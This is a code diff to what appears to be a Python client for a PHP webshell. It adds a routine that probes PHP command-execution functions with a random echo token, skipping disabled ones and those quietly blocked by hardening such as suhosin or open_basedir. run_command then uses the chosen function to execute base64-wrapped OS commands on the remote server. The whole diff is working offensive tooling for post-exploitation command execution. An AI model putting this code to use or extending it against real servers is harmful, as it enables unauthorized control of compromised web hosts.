@@ -19,7 +19,7 @@ from __future__ import annotations
 import base64
 
 from ..encoders import Encoder, base64_encode
-from ..exceptions import ExecutionFailed, NoExecFunction
+from ..exceptions import ExecutionFailed, NoExecFunction, WebshellError
 from ..utils.strings import random_token
 from .transport import Transport
 
@@ -91,8 +91,36 @@ class Executor:
             + ", ".join(sorted(_EXEC_BUILDERS))
         )
 
+    def _resolve_exec_function(self) -> str:
+        """Pick a command-exec function that actually produces output.
+
+        Probes each non-disabled candidate with a tiny ``echo`` and returns the
+        first that echoes back — catching functions that are listed-enabled but
+        silently neutered (suhosin/open_basedir). If none echo (inconclusive),
+        falls back to the first non-disabled candidate.
+        """
+        if self._exec_function is not None:
+            return self._exec_function
+        candidates = [name for name in _EXEC_BUILDERS if name not in self.disabled_functions]
+        if not candidates:
+            raise NoExecFunction(
+                "Every known command-execution function is disabled: "
+                + ", ".join(sorted(_EXEC_BUILDERS))
+            )
+        token = random_token(8)
+        probe = self._b64(f"echo {token}")
+        for name in candidates:
+            try:
+                if token in self.run_php(_EXEC_BUILDERS[name](probe)):
+                    self._exec_function = name
+                    return name
+            except WebshellError:
+                continue
+        self._exec_function = candidates[0]
+        return self._exec_function
+
     def run_command(self, command: str) -> str:
         """Run an OS command (stderr merged into stdout) and return its output."""
-        function = self.pick_exec_function()
+        function = self._resolve_exec_function()
         b64 = self._b64(f"{command} 2>&1")
         return self.run_php(_EXEC_BUILDERS[function](b64))
